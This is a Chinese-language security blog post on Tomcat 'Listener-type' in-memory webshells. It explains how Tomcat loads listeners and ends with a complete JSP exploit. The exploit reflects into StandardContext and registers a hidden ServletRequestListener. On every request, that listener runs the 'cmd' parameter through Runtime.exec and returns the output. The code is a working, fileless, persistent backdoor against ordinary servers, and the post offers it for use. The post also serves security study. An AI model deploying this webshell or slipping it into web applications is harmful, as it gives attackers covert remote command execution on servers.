---
title: JAVA安全-内存马-Listener型
date: 2025-10-15 20:00:00
tags: JAVA
categories: Java安全-内存马
---

> 参考：[Java内存马系列-04-Tomcat 之 Listener 型内存马 | Drunkbaby's Blog](https://drun1baby.top/2022/08/27/Java内存马系列-04-Tomcat-之-Listener-型内存马/#读取完配置文件，加载-Listener)

# Java安全-内存马-Listener型

## 环境搭建

环境搭建之前有写，将`filter`测试方法换位`listener`方法即可，后续`web.xml`也需要修改

## 前置知识

Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。

### Listener 三个域对象

- **ServletContextListener**
- **HttpSessionListener**
- **ServletRequestListener**

很明显，`ServletRequestListener` 是最适合用来作为内存马的。因为 `ServletRequestListener` 是用来监听 `ServletRequest`对 象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面我们来实现一个恶意的 Listener

### 测试代码

```java
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

@WebListener("/listenerTest")
public class listener implements ServletRequestListener {


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("Request Initialized");
    }
}

```

web.xml

```xml
        <listener>
        <listener-class>listener</listener-class>
         </listener>
```

然后启动tomcat，每次访问都会触发`requestInitialized`，无论请求是否存在都会触发

![image-20251015105412934](https://image.liam317.top/2025/10/2a9f3ff9d48b882a45e38355b81b6d32.png)

## 流程分析

### 读取所有listener

先从`ContextConfig.class`开始，要访问这个文件需要导入`catalina.jar`包，具体操作：`右上角设置->项目结构->模块->依赖->添加jar包->catalina.jar包在tomcat安装目录下的lib文件夹下`

通过查看`ContextConfig`可以知道，先读取了`web.xml`文件，然后再读取`web.xml`文件中的`listener`

![image-20251015105840134](https://image.liam317.top/2025/10/3278e7b324451c0ae5b583dd8a1e4206.png)

![image-20251015105907858](https://image.liam317.top/2025/10/0b664dc71f2aab42909d09b27d717fc7.png)

然后查看`addApplicationListener`，这是个接口下的方法，实现方法有两个，我们查看`StandardContext`类中的，之前`filte`内存马就是从这里出发的

![image-20251015110146812](https://image.liam317.top/2025/10/e7299cf4b1e6d2e2138e5de95a434778.png)

![image-20251015110635165](https://image.liam317.top/2025/10/418ec51abefb55047f6a6f31b8db647a.png)

这个其实就是循环把`web.xml`中的`listener`挨个读出来

### listenerStart

然后在这里将所有的`listener`写给`listeners`数组，后面就是去挨个调用`listener`，最后调用我们自定义的那个`listener`

![image-20251015110920002](https://image.liam317.top/2025/10/d99922d03aac26c200488e64bf8fb921.png)

# EXP编写

## EXP 分析

如果我们要实现 EXP，要做哪些步骤呢？

- 很明显的一点是，我们的恶意代码肯定是写在对应 Listener 的 `requestInitialized()` 方法里面的。
- 通过 StandardContext 类的 `addApplicationEventListener()` 方法把恶意的 Listener 放进去。

Listener 与 Filter 的大体流程是一样的，所以我们也可以把 Listener 先放到整个 Servlet 最前面去

这就是最基础的两步了，如果排先后顺序的话一定是先获取 StandardContext 类，再通过 `addApplicationEventListener()` 方法把恶意的 Listener 放进去，我们可以用流程图来表示一下运行过程。

![img](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ListenerRoute.png)

## EXP编写

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.util.Scanner" %>
<%
    ServletContext context1=pageContext.getServletContext();
    System.out.println(context1.getClass().getName());

    Field field1=context1.getClass().getDeclaredField("context");
    field1.setAccessible(true);
    ApplicationContext context2= (ApplicationContext) field1.get(context1);
    System.out.println(context2.getClass().getName());

    Field field2=context2.getClass().getDeclaredField("context");
    field2.setAccessible(true);
    StandardContext context3= (StandardContext) field2.get(context2);
    System.out.println(context3.getClass().getName());

    class Listener1 implements ServletRequestListener {

        public Listener1() {
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                RequestFacade reqfacade = (RequestFacade) sre.getServletRequest();
                Field reqfield = RequestFacade.class.getDeclaredField("request");
                reqfield.setAccessible(true);
                Request request = (Request) reqfield.get(reqfacade);
                Response response = (Response) request.getResponse();
                if (request.getParameter("cmd") != null) {
                    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                }
            } catch (Exception e) {
            }
        }
    }

    context3.addApplicationEventListener(new Listener1());
%>
```

![image-20251015112044596](https://image.liam317.top/2025/10/0dd091ab9a0cfa974dc5533b92cccd5c.png)